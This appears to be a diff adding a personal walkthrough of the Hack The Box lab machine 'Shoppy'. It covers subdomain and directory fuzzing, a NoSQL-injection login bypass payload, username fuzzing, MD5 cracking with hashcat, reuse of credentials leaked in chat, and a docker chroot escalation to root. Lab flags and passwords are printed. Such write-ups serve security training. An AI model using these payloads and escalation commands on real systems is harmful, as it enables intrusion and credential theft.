@@ -1,0 +1,255 @@
+port 80:
+
+https://shoppy.htb/
+
+add shoppy.htb to /etc/hosts
+
+
+ Shoppy beta coming soon ! Stay tuned for beta access ! 
+ 
+ 
+try looking for vhosts
+
+
+wfuzz -c -f subdomains.txt -w /home/kali/Desktop/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://shoppy.htb/" -H "Host: FUZZ.shoppy.htb" --hl 7
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://shoppy.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000047340:   200        0 L      141 W      3122 Ch     "mattermost"  
+
+
+add mattermost.shoppy.htb to /etc/hosts
+
+mattermost requires a login but I have no credentials 
+
+
+
+
+
+
+
+
+try directory listing 
+
+ sudo gobuster  dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirb/big.txt -o dirfuzzing -n -e -x .php,.html,.txt,.htm,.js,.xml,.svg,.py,.csv -t 200
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://shoppy.htb/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Extensions:              svg,csv,txt,htm,js,xml,py,php,html
+[+] Expanded:                true
+[+] No status:               true
+[+] Timeout:                 10s
+===============================================================
+2023/01/10 10:42:02 Starting gobuster in directory enumeration mode
+===============================================================
+http://shoppy.htb/ADMIN                [Size: 28] [--> /login]
+http://shoppy.htb/Admin                [Size: 28] [--> /login]
+http://shoppy.htb/Login                [Size: 1074]
+http://shoppy.htb/admin                [Size: 28] [--> /login]
+http://shoppy.htb/assets               [Size: 179] [--> /assets/]
+http://shoppy.htb/css                  [Size: 173] [--> /css/]
+http://shoppy.htb/exports              [Size: 181] [--> /exports/]
+http://shoppy.htb/favicon.ico          [Size: 213054]
+http://shoppy.htb/fonts                [Size: 177] [--> /fonts/]
+http://shoppy.htb/images               [Size: 179] [--> /images/]
+http://shoppy.htb/js                   [Size: 171] [--> /js/]
+http://shoppy.htb/login                [Size: 1074]
+Progress: 204690 / 204700 (100.00%)
+
+
+login page:
+
+http://shoppy.htb/login
+
+I tried various payloads and found:
+
+admin'||'1==1
+pwd
+
+works to access the administrator dashboard
+
+I can look for users and download exports of their data (username and pwd)
+
+I search for "admin" and find:
+
+
+_id		"62db0e93d6d6a999a66ee67a"
+username	"admin"
+password	"23c6877d9e2b564ef8b32c3a23de27b2"
+
+now I need to find other users
+
+I could try with wfuzz because the request is a GET and I can fuzz the url:
+
+http://shoppy.htb/admin/search-users?username=admin
+
+
+wfuzz -z file,/home/kali/Desktop/SecLists/Discovery/Web-Content/big.txt -d "username=FUZZ'||''==='&password=test" --hh 51 http://shoppy.htb/login                
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://shoppy.htb/login
+Total requests: 20476
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000001817:   302        0 L      4 W        28 Ch       "admin"                                                                                                                                                                    
+000010166:   302        0 L      4 W        28 Ch       "josh"     
+
+
+_id	"62db0e93d6d6a999a66ee67b"
+username	"josh"
+password	"6ebcea65320589ca4f2f1ce039975995"
+
+
+it looks like the passwords are hashed
+
+hash-identifier 6ebcea65320589ca4f2f1ce039975995
+
+
+Possible Hashs:
+[+] MD5
+
+
+as MD5
+
+
+hashcat -m 0  passwords /usr/share/wordlists/rockyou.txt -O 
+
+
+6ebcea65320589ca4f2f1ce039975995:remembermethisway
+
+the password for josh is remembermethisway
+
+
+I can try to login to mattermost with these credentials
+
+yes I can login
+
+
+I find various interesting chat:
+
+
+Hey @josh,
+
+For the deploy machine, you can create an account with these creds :
+username: jaeger
+password: Sh0ppyBest@pp!
+
+
+Hey @jaeger, when I was trying to install docker on the machine, I started learn C++ and I do a password manager. You can test it if you want, the program is on the deploy machine.
+
+
+I can try these credentials with ssh 
+
+
+I can't access as josh 
+try as jaeger
+
+jaeger@shoppy:~$ id
+uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
+jaeger@shoppy:~$ pwd
+/home/jaeger
+jaeger@shoppy:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
+jaeger@shoppy:~$ cat user.txt
+5aa0ac67e1cf9cf4fcc10151fd74040b
+
+
+I should probably look at docker and see if I can find the password manager created by user josh
+
+
+jaeger@shoppy:~/ShoppyApp$ sudo -l
+[sudo] password for jaeger: 
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+
+
+
+jaeger@shoppy:~/ShoppyApp$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: 
+
+
+Sh0ppyBest@pp!    is NOT the master password
+
+
+using strings /home/deploy/password-manager
+
+I get:
+
+Welcome to Josh password manager!
+Please enter your master password: 
+Access granted! Here is creds !
+cat /home/deploy/creds.txt
+Access denied! This incident will be reported !
+
+
+
+
+
+while using cat I get:
+
+Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
+
+the word Sample is not in the strings, this could be the master password
+
+jaeger@shoppy:~/ShoppyApp$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+
+
+jaeger@shoppy:~/ShoppyApp$ su - deploy
+Password: 
+$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+$ pwd
+/home/deploy
+
+
+this user can't use sudo on the machine 
+but it should be able to use docker (based on the messages on mattermost)
+
+https://gtfobins.github.io/gtfobins/docker/
+
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# cd root
+# cat root.txt
+dcc7db2a0bd209015a68d9b312ad93d6
+
+
+
+
+
+
+
+
